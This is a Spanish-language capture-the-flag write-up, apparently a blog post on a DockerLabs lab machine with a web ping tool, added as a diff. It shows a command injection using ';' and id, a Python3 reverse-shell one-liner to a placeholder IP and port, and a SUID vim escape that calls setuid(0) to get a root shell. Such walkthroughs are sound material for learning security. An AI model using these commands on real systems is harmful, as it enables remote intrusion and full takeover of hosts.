@@ -1,0 +1,78 @@
+I"<p>Para la fase de reconocimiento inicial utilicé un script que diseñé que me permite el escaneo de puertos, servicios, directorios web, y algunas vulnerabilidades conocidas de manera automatizada.
+Pueden encontrar esta herramienta en mi perfil de Github.</p>
+
+<p><img src="/secnotes/assets/img/ping/escaneo1.png" alt="img2" /></p>
+
+<p>Este script nos muestra la siguiente información:</p>
+
+<p><img src="/secnotes/assets/img/ping/escaneo2.png" alt="img3" /></p>
+
+<p>Al acceder al servicio web desde el navegador, nos encontramos con una herramienta de Ping</p>
+
+<p><img src="/secnotes/assets/img/ping/web.png" alt="img4" /></p>
+
+<p><img src="/secnotes/assets/img/ping/web1.png" alt="img5" /></p>
+
+<p>Después de realizar la prueba sugerida en la herramienta, podemos notar algo..
+si una web recibe un parámetro que parece un comando del sistema y devuelve una salida de consola, podemos asumir que  la web es vulnerable a Command Injection hasta que se demuestre lo contrario. 
+Así que realizamos una prueba simple lanzando algún comando del sistema.</p>
+
+<p><img src="/secnotes/assets/img/ping/rce.png" alt="img6" /></p>
+
+<p>Para confirmar esta vulnerabilidad, se inyectó un separador de comandos (;) seguido del comando id.
+El servidor nos devolvió la salida del comando ejecutado con los privilegios del usuario del servidor web (www-data).</p>
+
+<p>Ya que podemos realizar la ejecución de comandos, podemos intentar la conexión al servidor mediante una reverse shell. Para esto primero debemos saber que reverse shell podemos elegir.
+El primer paso será elegir un interprete disponible en el sistema. Así que, con el comando <code class="language-plaintext highlighter-rouge">which</code> buscaremos una shell disponible (bash, sh, python, python3, perl, nc)</p>
+
+<p><img src="/secnotes/assets/img/ping/shell.png" alt="img7" /></p>
+
+<p>Una vez lanzando el comando, vemos que tenemos varias shell disponibles para utilizar.</p>
+
+<p><code class="language-plaintext highlighter-rouge">python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'</code></p>
+
+<p>Para ejecutar nuestra reverse shell, pegaremos el código después del separador que utilizamos en el momento de confirmar el RCE</p>
+
+<p><img src="/secnotes/assets/img/ping/rshell.png" alt="img8" /></p>
+
+<p><img src="/secnotes/assets/img/ping/rshell1.png" alt="img9" /></p>
+
+<p>Al ejecutar obtenemos la conexión al servidor.</p>
+
+<p>Una vez dentro del sistema debemos buscar algún permiso que nos permita la escalada de privilegios. Hay varias formas de hacer esto. En este caso no nos funcionó <code class="language-plaintext highlighter-rouge">sudo -l</code> así que buscaremos con el comando ingresado.</p>
+
+<p><img src="/secnotes/assets/img/ping/perm.png" alt="img10" /></p>
+
+<p>Luego de esta búsqueda, vemos que vim tiene permisos especiales (s) lo que significa que cualquier usuario que puede lanzar vim como usuario root</p>
+
+<p><img src="/secnotes/assets/img/ping/vim.png" alt="img11" /></p>
+
+<p><img src="/secnotes/assets/img/ping/vim1.png" alt="img12" /></p>
+
+<p>dice que si tenemos el SUID podemos ejecutar comandos heredados.</p>
+
+<p>Sabiendo esto, luego de una investigación y con ayuda de la IA generamos un codigo que nos ayudará a escalar privilegios</p>
+
+<p><code class="language-plaintext highlighter-rouge">vim.basic -c ':python3 import os, pty; os.setuid(0); pty.spawn("/bin/bash")' </code></p>
+
+<p><strong>vamos a entender este comando</strong></p>
+
+<p>vim.basic -c ‘COMANDO’= indica a vim que ejecute el comando automaticamente al abrir</p>
+
+<p>:python3 = ejecuta el codigo en python3, el codigo corre dentro del proceso de vim y hereda el EUID=0 (por el SUID de vim)</p>
+
+<p>import os, pty = permite interactuar con el sistema operativo, pty permite crear pseudo-terminales (necesario para tener una shell interactiva)</p>
+
+<p>os.setuid(0) = cambia el UID real del proceso a 0 (root), esto funciona por que vim tiene el permiso especial  SUID</p>
+
+<p>pty.spawn(“/bin/bash”) = lanza /bin/bash, lo ata a la psudo terminal creada, nos da una shell interactiva real (permite usar Ctrl+C, tab, comandos interactivos y estabilidad)</p>
+
+<p>al lanzar este comando automáticamente nos convertimos en usuarios root</p>
+
+<p><img src="/secnotes/assets/img/ping/root.png" alt="img13" /></p>
+
+<p>☕ ¿Te sirvió el Write-up?
+Si este contenido te ayudó a rootear la máquina o a aprender algo nuevo, ¡puedes invitarme un café! Todo el apoyo se va directo a mejorar el blog y seguir subiendo retos de DockerLabs.</p>
+
+<p><img src="https://img.buymeacoffee.com/button-api/?text=Invítame un café&amp;emoji=☕&amp;slug=TU_USUARIO&amp;button_colour=FFDD00&amp;font_colour=000000&amp;font_family=Cookie&amp;outline_colour=000000&amp;coffee_colour=ffffff" alt="Invitame un café" /></p>
+:ET
